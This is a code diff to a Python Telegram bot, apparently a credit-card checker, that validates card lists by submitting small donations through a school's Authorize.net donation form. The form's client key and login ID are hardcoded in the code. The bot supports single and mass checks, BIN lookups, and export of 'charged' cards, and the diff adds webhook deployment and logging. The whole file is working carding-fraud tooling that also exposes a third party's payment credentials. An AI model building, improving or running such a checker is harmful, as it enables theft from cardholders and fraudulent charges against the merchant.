@@ -5,10 +5,12 @@ import json
 import re
 import time
 import random
+import os
 from typing import Optional, Tuple, List
 from dataclasses import dataclass
-from io import StringIO
-import pandas as pd
+from io import StringIO, BytesIO
+import nest_asyncio
+from faker import Faker
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
@@ -19,35 +21,41 @@ from telegram.ext import (
     filters
 )
 from telegram.constants import ParseMode
-import nest_asyncio
-from faker import Faker
-from colorama import Fore, Style, init
+from telegram.error import TimedOut, NetworkError
+import colorama
+from colorama import Fore, Style
 
-# Apply nest_asyncio to allow running in Jupyter/Colab environments
+# Apply nest_asyncio to allow running in async environments
 nest_asyncio.apply()
 
-# Initialize logging
+# Initialize colorama
+colorama.init(autoreset=True)
+
+# Configure logging for Railway
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
+    level=logging.INFO,
+    handlers=[
+        logging.FileHandler("bot.log"),
+        logging.StreamHandler()
+    ]
 )
 logger = logging.getLogger(__name__)
 
-init(autoreset=True)
-fake = Faker()
+# Configuration from environment variables (Railway recommended)
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+PORT = int(os.environ.get("PORT", 8080))
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")  # Your Railway app URL
 
-# Configuration
+# API Configuration
 CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
 API_LOGIN_ID = "93HEsxKeZ4D"
 BASE_URL = "https://www.jetsschool.org"
 FORM_ID = "6913"
 AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"
 
-# Bot token - Replace with your actual bot token
-BOT_TOKEN = "8281727081:AAGPEFk6e0kGj_5eQ_wBPATRAQrQxYbATfE"
-
-# Admin user IDs (Replace with actual admin IDs)
-ADMIN_IDS = [7708627627, 987654321]
+# Admin user IDs (Set in Railway environment variables)
+ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]
 
 # Emoji constants for UI
 EMOJIS = {
@@ -69,20 +77,27 @@ EMOJIS = {
     "user": "👤",
     "bot": "🤖",
     "lock": "🔒",
-    "unlock": "🔓"
+    "unlock": "🔓",
+    "refresh": "🔄",
+    "wave": "👋",
+    "bank": "🏦",
+    "location": "📍",
+    "robot": "🤖"
 }
+
+fake = Faker()
 
 @dataclass
 class CheckResult:
     """Data class for check results"""
     card_number: str
-    status: str  # CHARGED, DECLINED, ERROR
+    status: str
     message: str
     timestamp: float
     bin_info: Optional[dict] = None
 
 class AuthorizeNetChecker:
-    """Main checker class adapted for async operations"""
+    """Main checker class"""
     
     def __init__(self, proxy: Optional[str] = None):
         self.proxy = proxy
@@ -99,8 +114,8 @@ class AuthorizeNetChecker:
             url = f"{BASE_URL}/donate/?form-id={FORM_ID}"
             async with session.get(url, timeout=20) as response:
                 await response.text()
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"Cookie fetch error: {e}")
 
     async def tokenize_cc(self, cc: str, mm: str, yy: str, cvv: str, session: aiohttp.ClientSession) -> Tuple[Optional[str], Optional[str], Optional[str]]:
         """Tokenize credit card via Authorize.net API"""
@@ -144,6 +159,7 @@ class AuthorizeNetChecker:
                 msg = data.get("messages", {}).get("message", [{}])[0].get("text", "Tokenization Failed")
                 return None, None, msg
         except Exception as e:
+            logger.error(f"Tokenization error: {e}")
             return None, None, str(e)
 
     async def submit_donation(self, cc_full: str, descriptor: str, value: str, session: aiohttp.ClientSession) -> Tuple[str, str]:
@@ -191,7 +207,8 @@ class AuthorizeNetChecker:
                     data["give-form-hash"] = hash_match.group(1)
                 else:
                     return "ERROR", "Could not find give-form-hash"
-        except Exception:
+        except Exception as e:
+            logger.error(f"Form hash error: {e}")
             return "ERROR", "Failed to load donation page"
 
         try:
@@ -214,6 +231,7 @@ class AuthorizeNetChecker:
                     return "DECLINED", "Unknown Response"
                     
         except Exception as e:
+            logger.error(f"Submission error: {e}")
             return "ERROR", str(e)
 
     async def check_card(self, cc_line: str) -> CheckResult:
@@ -229,7 +247,7 @@ class AuthorizeNetChecker:
             
             cc, mm, yy, cvv = cc_line.strip().split("|")
             
-            # Get BIN info for additional details
+            # Get BIN info
             bin_info = await self.get_bin_info(cc[:6])
             
             connector = aiohttp.TCPConnector(ssl=False)
@@ -258,6 +276,7 @@ class AuthorizeNetChecker:
                 )
                 
         except Exception as e:
+            logger.error(f"Check card error: {e}")
             return CheckResult(
                 card_number=cc_line.split("|")[0] if "|" in cc_line else "Unknown",
                 status="ERROR",
@@ -272,12 +291,12 @@ class AuthorizeNetChecker:
                 async with session.get(f"https://lookup.binlist.net/{bin_number}", timeout=10) as response:
                     if response.status == 200:
                         return await response.json()
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"BIN lookup error: {e}")
         return None
 
 class CheckBot:
-    """Main bot class with UI enhancements"""
+    """Main bot class"""
     
     def __init__(self, token: str):
         self.token = token
@@ -291,15 +310,20 @@ class CheckBot:
             "errors": 0
         }
 
+    def mask_card(self, card: str) -> str:
+        """Mask card number for display"""
+        if len(card) >= 12:
+            return f"{card[:6]}******{card[-4:]}"
+        return card
+
     def format_card_result(self, result: CheckResult) -> str:
-        """Format card check result with beautiful UI"""
+        """Format card check result"""
         status_emoji = {
             "CHARGED": f"{EMOJIS['success']} CHARGED",
             "DECLINED": f"{EMOJIS['error']} DECLINED",
             "ERROR": f"{EMOJIS['warning']} ERROR"
         }.get(result.status, f"{EMOJIS['info']} UNKNOWN")
         
-        # Format BIN info if available
         bin_text = ""
         if result.bin_info:
             scheme = result.bin_info.get('scheme', 'Unknown').upper()
@@ -311,10 +335,8 @@ class CheckBot:
             bin_text += f"\n┣ {EMOJIS['bank']} Bank: {bank}"
             bin_text += f"\n┗ {EMOJIS['location']} Country: {country}"
         
-        # Format time
         check_time = time.strftime("%H:%M:%S", time.localtime(result.timestamp))
         
-        # Build the message with box drawing characters
         message = f"""
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃  {EMOJIS['card']}  CARD CHECK RESULT  {EMOJIS['check']} 
@@ -326,12 +348,6 @@ class CheckBot:
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
         """
         return message
-
-    def mask_card(self, card: str) -> str:
-        """Mask card number for display"""
-        if len(card) >= 12:
-            return f"{card[:6]}******{card[-4:]}"
-        return card
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle /start command"""
@@ -401,7 +417,7 @@ class CheckBot:
         await update.message.reply_text(help_msg, parse_mode=ParseMode.MARKDOWN)
 
     async def single_check(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /au command for single card check"""
+        """Handle /au command"""
         if not context.args:
             await update.message.reply_text(
                 f"{EMOJIS['warning']} Usage: `/au CC|MM|YYYY|CVV`\n"
@@ -413,8 +429,8 @@ class CheckBot:
         card_data = " ".join(context.args)
         await self.process_single_card(update, card_data)
 
-    async def process_single_card(self, update: Update, card_data: str, edit_message: bool = False):
-        """Process a single card check"""
+    async def process_single_card(self, update: Update, card_data: str):
+        """Process single card check"""
         status_msg = await update.message.reply_text(
             f"{EMOJIS['clock']} Processing card: `{self.mask_card(card_data.split('|')[0])}`...\n"
             f"┣ Tokenizing...\n"
@@ -427,7 +443,7 @@ class CheckBot:
         result = await checker.check_card(card_data)
         self.active_checks -= 1
         
-        # Update statistics
+        # Update stats
         self.stats["total_checks"] += 1
         if result.status == "CHARGED":
             self.stats["charged"] += 1
@@ -438,10 +454,8 @@ class CheckBot:
         
         self.results_history.append(result)
         
-        # Format and send result
         result_msg = self.format_card_result(result)
         
-        # Add action buttons
         keyboard = [
             [InlineKeyboardButton(f"{EMOJIS['check']} Check Another", callback_data="single"),
              InlineKeyboardButton(f"{EMOJIS['file']} Mass Check", callback_data="mass")],
@@ -449,14 +463,18 @@ class CheckBot:
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await status_msg.edit_text(
-            result_msg,
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        try:
+            await status_msg.edit_text(
+                result_msg,
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=reply_markup
+            )
+        except Exception as e:
+            logger.error(f"Edit message error: {e}")
+            await update.message.reply_text(result_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     async def mass_check_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /mau command for mass check from file"""
+        """Handle /mau command"""
         if not update.message.reply_to_message or not update.message.reply_to_message.document:
             await update.message.reply_text(
                 f"{EMOJIS['warning']} Please reply to a file with `/mau` command",
@@ -464,23 +482,28 @@ class CheckBot:
             )
             return
 
+        await update.message.reply_text(f"{EMOJIS['clock']} Processing file... Please wait.")
+
         document = update.message.reply_to_message.document
         file = await context.bot.get_file(document.file_id)
         
-        # Download file content
-        file_content = await file.download_as_bytearray()
-        content = file_content.decode('utf-8', errors='ignore')
-        
-        cards = [line.strip() for line in content.split('\n') if line.strip() and '|' in line]
-        
-        if not cards:
-            await update.message.reply_text(f"{EMOJIS['warning']} No valid cards found in file")
-            return
+        try:
+            file_content = await file.download_as_bytearray()
+            content = file_content.decode('utf-8', errors='ignore')
+            
+            cards = [line.strip() for line in content.split('\n') if line.strip() and '|' in line]
+            
+            if not cards:
+                await update.message.reply_text(f"{EMOJIS['warning']} No valid cards found in file")
+                return
 
-        await self.process_mass_cards(update, cards, "file")
+            await self.process_mass_cards(update, cards, "file")
+        except Exception as e:
+            logger.error(f"File processing error: {e}")
+            await update.message.reply_text(f"{EMOJIS['error']} Error processing file: {str(e)}")
 
     async def mass_check_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle /autxt command for mass check from text"""
+        """Handle /autxt command"""
         if not context.args:
             await update.message.reply_text(
                 f"{EMOJIS['warning']} Please provide card data or reply to a message with cards",
@@ -498,7 +521,7 @@ class CheckBot:
         await self.process_mass_cards(update, cards, "text")
 
     async def process_mass_cards(self, update: Update, cards: List[str], source_type: str):
-        """Process multiple cards in mass check mode"""
+        """Process multiple cards"""
         status_msg = await update.message.reply_text(
             f"{EMOJIS['rocket']} Starting mass check of {len(cards)} cards...\n"
             f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -510,7 +533,6 @@ class CheckBot:
         )
 
         results = []
-        progress_chars = ["░", "▒", "▓", "█"]
         
         for i, card in enumerate(cards):
             self.active_checks += 1
@@ -519,7 +541,7 @@ class CheckBot:
             self.active_checks -= 1
             results.append(result)
             
-            # Update statistics
+            # Update stats
             self.stats["total_checks"] += 1
             if result.status == "CHARGED":
                 self.stats["charged"] += 1
@@ -528,29 +550,28 @@ class CheckBot:
             else:
                 self.stats["errors"] += 1
             
-            # Update progress every 5 cards or on last card
-            if (i + 1) % 5 == 0 or i + 1 == len(cards):
-                progress = (i + 1) / len(cards)
-                bar_length = 20
-                filled = int(bar_length * progress)
-                bar = progress_chars[-1] * filled + progress_chars[0] * (bar_length - filled)
-                
+            # Update progress
+            if (i + 1) % 3 == 0 or i + 1 == len(cards):
                 charged = sum(1 for r in results if r.status == "CHARGED")
                 declined = sum(1 for r in results if r.status == "DECLINED")
                 errors = sum(1 for r in results if r.status == "ERROR")
                 
-                await status_msg.edit_text(
-                    f"{EMOJIS['rocket']} Mass Check Progress\n"
-                    f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"`[{bar}]` {int(progress*100)}%\n"
-                    f"Progress: {i+1}/{len(cards)}\n"
-                    f"{EMOJIS['success']} Charged: {charged}\n"
-                    f"{EMOJIS['error']} Declined: {declined}\n"
-                    f"{EMOJIS['warning']} Errors: {errors}",
-                    parse_mode=ParseMode.MARKDOWN
-                )
+                try:
+                    await status_msg.edit_text(
+                        f"{EMOJIS['rocket']} Mass Check Progress\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"Progress: {i+1}/{len(cards)}\n"
+                        f"{EMOJIS['success']} Charged: {charged}\n"
+                        f"{EMOJIS['error']} Declined: {declined}\n"
+                        f"{EMOJIS['warning']} Errors: {errors}",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                except:
+                    pass
+            
+            # Small delay to avoid rate limiting
+            await asyncio.sleep(0.5)
         
-        # Create summary report
         await self.send_mass_check_summary(update, results, status_msg)
 
     async def send_mass_check_summary(self, update: Update, results: List[CheckResult], status_msg):
@@ -568,17 +589,16 @@ class CheckBot:
 ┃ {EMOJIS['error']} DECLINED: {len(declined)}
 ┃ {EMOJIS['warning']} ERRORS: {len(errors)}
 ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃ {EMOJIS['money']} Success Rate: {(len(charged)/len(results)*100):.1f}%
+┃ {EMOJIS['money']} Success Rate: {(len(charged)/len(results)*100):.1f}% if len(results) > 0 else 0
 ┃ {EMOJIS['clock']} Time: {time.strftime('%H:%M:%S')}
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
         """
         
-        # Create detailed results file
+        # Send result files
         if charged:
-            charged_text = "\n".join([
-                f"{r.card_number}|CHARGED|{r.message}" for r in charged
-            ])
-            charged_file = StringIO(charged_text)
+            charged_text = "\n".join([f"{r.card_number}|{r.status}|{r.message}" for r in charged])
+            charged_file = BytesIO(charged_text.encode())
+            charged_file.name = "charged_cards.txt"
             await update.message.reply_document(
                 document=charged_file,
                 filename="charged_cards.txt",
@@ -586,10 +606,9 @@ class CheckBot:
             )
         
         if declined:
-            declined_text = "\n".join([
-                f"{r.card_number}|DECLINED|{r.message}" for r in declined
-            ])
-            declined_file = StringIO(declined_text)
+            declined_text = "\n".join([f"{r.card_number}|{r.status}|{r.message}" for r in declined])
+            declined_file = BytesIO(declined_text.encode())
+            declined_file.name = "declined_cards.txt"
             await update.message.reply_document(
                 document=declined_file,
                 filename="declined_cards.txt",
@@ -602,22 +621,15 @@ class CheckBot:
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await status_msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+        try:
+            await status_msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+        except:
+            await update.message.reply_text(summary, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     async def stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle /stats command"""
-        # Calculate success rate
         total = self.stats["total_checks"]
         success_rate = (self.stats["charged"] / total * 100) if total > 0 else 0
-        
-        # Get recent results
-        recent = self.results_history[-10:] if self.results_history else []
-        recent_text = ""
-        if recent:
-            recent_text = "\n┣ Recent Results:\n"
-            for r in recent[-5:]:
-                emoji = EMOJIS['success'] if r.status == "CHARGED" else EMOJIS['error'] if r.status == "DECLINED" else EMOJIS['warning']
-                recent_text += f"┃ {emoji} {self.mask_card(r.card_number)} - {r.status}\n"
         
         stats_msg = f"""
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -630,8 +642,6 @@ class CheckBot:
 ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ {EMOJIS['money']} Success Rate: {success_rate:.1f}%
 ┃ {EMOJIS['clock']} Active Checks: {self.active_checks}
-┃ {EMOJIS['user']} Total Users: {len(self.results_history)}
-{recent_text}
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
         """
         
@@ -644,7 +654,7 @@ class CheckBot:
         await update.message.reply_text(stats_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle inline button callbacks"""
+        """Handle button callbacks"""
         query = update.callback_query
         await query.answer()
         
@@ -658,10 +668,32 @@ class CheckBot:
                 f"{EMOJIS['file']} Send a file with cards or use `/autxt` command",
                 parse_mode=ParseMode.MARKDOWN
             )
-        elif query.data == "stats":
-            await self.stats(update, context)
-        elif query.data == "refresh_stats":
-            await self.stats(update, context)
+        elif query.data == "stats" or query.data == "refresh_stats":
+            # Create a new stats message
+            total = self.stats["total_checks"]
+            success_rate = (self.stats["charged"] / total * 100) if total > 0 else 0
+            
+            stats_msg = f"""
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃      {EMOJIS['stats']}  BOT STATISTICS  {EMOJIS['stats']}       
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ {EMOJIS['database']} Total Checks: {total}
+┃ {EMOJIS['success']} Charged: {self.stats['charged']}
+┃ {EMOJIS['error']} Declined: {self.stats['declined']}
+┃ {EMOJIS['warning']} Errors: {self.stats['errors']}
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ {EMOJIS['money']} Success Rate: {success_rate:.1f}%
+┃ {EMOJIS['clock']} Active Checks: {self.active_checks}
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+            """
+            
+            keyboard = [
+                [InlineKeyboardButton(f"{EMOJIS['refresh']} Refresh", callback_data="refresh_stats"),
+                 InlineKeyboardButton(f"{EMOJIS['check']} New Check", callback_data="single")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await query.message.edit_text(stats_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
         elif query.data == "settings":
             settings_msg = f"""
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
@@ -673,7 +705,7 @@ class CheckBot:
 ┃ {EMOJIS['card']} Format: CC|MM|YYYY|CVV
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
             """
-            await query.message.reply_text(settings_msg, parse_mode=ParseMode.MARKDOWN)
+            await query.message.edit_text(settings_msg, parse_mode=ParseMode.MARKDOWN)
 
     async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle errors"""
@@ -681,44 +713,94 @@ class CheckBot:
         try:
             if update and update.effective_message:
                 await update.effective_message.reply_text(
-                    f"{EMOJIS['error']} An error occurred. Please try again."
+                    f"{EMOJIS['error']} An error occurred. Please try again later."
                 )
         except:
             pass
 
-    def run(self):
-        """Run the bot"""
-        self.application = Application.builder().token(self.token).build()
+    async def post_init(self, application: Application):
+        """Initialize bot after application is created"""
+        logger.info(f"Bot initialized successfully!")
         
-        # Add command handlers
+    async def run_webhook(self):
+        """Run bot with webhook for Railway"""
+        # Build application
+        self.application = (
+            Application.builder()
+            .token(self.token)
+            .post_init(self.post_init)
+            .build()
+        )
+        
+        # Add handlers
         self.application.add_handler(CommandHandler("start", self.start))
         self.application.add_handler(CommandHandler("help", self.help))
         self.application.add_handler(CommandHandler("au", self.single_check))
         self.application.add_handler(CommandHandler("mau", self.mass_check_file))
         self.application.add_handler(CommandHandler("autxt", self.mass_check_text))
         self.application.add_handler(CommandHandler("stats", self.stats))
-        
-        # Add callback query handler for buttons
         self.application.add_handler(CallbackQueryHandler(self.button_handler))
-        
-        # Add error handler
         self.application.add_error_handler(self.error_handler)
         
-        # Start the bot
-        print(f"{Fore.GREEN}{EMOJIS['rocket']} Bot is starting...{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{EMOJIS['bot']} Bot username: @{self.application.bot.username if hasattr(self.application.bot, 'username') else 'Unknown'}{Style.RESET_ALL}")
+        # Initialize application
+        await self.application.initialize()
         
-        self.application.run_polling(allowed_updates=Update.ALL_TYPES)
+        # Set webhook
+        webhook_url = f"{WEBHOOK_URL}/webhook"
+        await self.application.bot.set_webhook(url=webhook_url)
+        logger.info(f"Webhook set to {webhook_url}")
+        
+        # Start webhook
+        await self.application.start()
+        logger.info(f"Bot is running on port {PORT}")
+        
+        # Keep running
+        try:
+            while True:
+                await asyncio.sleep(1)
+        except KeyboardInterrupt:
+            logger.info("Stopping bot...")
+            await self.application.stop()
+    
+    def run(self):
+        """Main run method"""
+        if WEBHOOK_URL:
+            # Run with webhook for Railway
+            asyncio.run(self.run_webhook())
+        else:
+            # Run with polling for local development
+            self.application = (
+                Application.builder()
+                .token(self.token)
+                .post_init(self.post_init)
+                .build()
+            )
+            
+            self.application.add_handler(CommandHandler("start", self.start))
+            self.application.add_handler(CommandHandler("help", self.help))
+            self.application.add_handler(CommandHandler("au", self.single_check))
+            self.application.add_handler(CommandHandler("mau", self.mass_check_file))
+            self.application.add_handler(CommandHandler("autxt", self.mass_check_text))
+            self.application.add_handler(CommandHandler("stats", self.stats))
+            self.application.add_handler(CallbackQueryHandler(self.button_handler))
+            self.application.add_error_handler(self.error_handler)
+            
+            logger.info("Starting bot with polling...")
+            self.application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 def main():
-    """Main function to run the bot"""
-    # Check if bot token is set
+    """Main entry point"""
+    print(f"{Fore.GREEN}{EMOJIS['rocket']} Starting CC Checker Bot...{Style.RESET_ALL}")
+    
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print(f"{Fore.RED}{EMOJIS['error']} Please set your BOT_TOKEN in the script!{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}Get a token from @BotFather on Telegram{Style.RESET_ALL}")
+        print(f"{Fore.RED}{EMOJIS['error']} Please set your BOT_TOKEN in environment variables!{Style.RESET_ALL}")
         return
     
-    # Create and run bot
+    if WEBHOOK_URL:
+        print(f"{Fore.CYAN}Running in webhook mode on port {PORT}{Style.RESET_ALL}")
+    else:
+        print(f"{Fore.YELLOW}Running in polling mode (local development){Style.RESET_ALL}")
+    
     bot = CheckBot(BOT_TOKEN)
     bot.run()
 
